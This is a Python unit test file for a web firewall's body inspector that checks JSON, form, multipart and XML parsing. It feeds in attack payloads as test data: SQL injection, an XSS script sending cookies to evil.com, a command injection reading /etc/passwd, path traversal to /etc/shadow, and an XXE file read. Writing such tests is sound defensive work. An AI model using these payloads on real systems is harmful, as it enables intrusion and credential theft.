"""Unit Tests for Request Body Inspector (JSON, Form, Multipart, XML, XXE)."""
import pytest
from web_firewall.config.settings import WAFSettings
from web_firewall.parsers.body_parser import BodyParser
from web_firewall.inspectors.body_inspector import BodyInspector


@pytest.fixture
def inspector():
    settings = WAFSettings(MAX_BODY_SIZE=1024, MAX_DECODE_ITERATIONS=3)
    return BodyInspector(settings=settings)


@pytest.fixture
def parser():
    return BodyParser(max_body_size=1024)


def test_safe_json_body(inspector, parser):
    raw = b'{"username": "johndoe", "age": 30, "active": true}'
    parsed = parser.parse(raw, "application/json")
    res = inspector.inspect(parsed)
    assert res.is_safe is True


def test_oversized_body(inspector, parser):
    raw = b"A" * 2000
    parsed = parser.parse(raw, "text/plain")
    res = inspector.inspect(parsed)
    assert res.is_safe is False
    assert "size exceeds maximum limit" in res.reason


def test_malicious_json_sqli(inspector, parser):
    raw = b'{"query": "admin\' OR 1=1--"}'
    parsed = parser.parse(raw, "application/json")
    res = inspector.inspect(parsed)
    assert res.is_safe is False
    assert "SQL_INJECTION" in res.reason or "SQL" in (res.matched_rule or "")


def test_malicious_json_xss(inspector, parser):
    raw = b'{"comment": "<script>fetch(\'http://evil.com?c=\'+document.cookie)</script>"}'
    parsed = parser.parse(raw, "application/json")
    res = inspector.inspect(parsed)
    assert res.is_safe is False
    assert res.matched_rule == "XSS-001"


def test_malicious_form_command_injection(inspector, parser):
    raw = b"hostname=server1;cat /etc/passwd&action=ping"
    parsed = parser.parse(raw, "application/x-www-form-urlencoded")
    res = inspector.inspect(parsed)
    assert res.is_safe is False
    assert res.matched_rule in ("CI-001", "PT-004")


def test_malicious_multipart_traversal(inspector, parser):
    boundary = "----WebKitFormBoundary7MA4YWxkTrZu0gW"
    raw = (
        f"--{boundary}\r\n"
        'Content-Disposition: form-data; name="file"; filename="../../etc/shadow"\r\n'
        "Content-Type: text/plain\r\n\r\n"
        "malicious content\r\n"
        f"--{boundary}--\r\n"
    ).encode("latin-1")

    parsed = parser.parse(raw, f"multipart/form-data; boundary={boundary}")
    res = inspector.inspect(parsed)
    assert res.is_safe is False
    assert res.matched_rule in ("PT-001", "PT-004")


def test_malicious_xml_xxe(inspector, parser):
    xxe_payload = b"""<?xml version="1.0"?>
    <!DOCTYPE root [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
    ]>
    <root>
        <data>&xxe;</data>
    </root>"""

    parsed = parser.parse(xxe_payload, "application/xml")
    res = inspector.inspect(parsed)
    assert res.is_safe is False
    assert res.matched_rule in ("XXE-001", "PT-004")
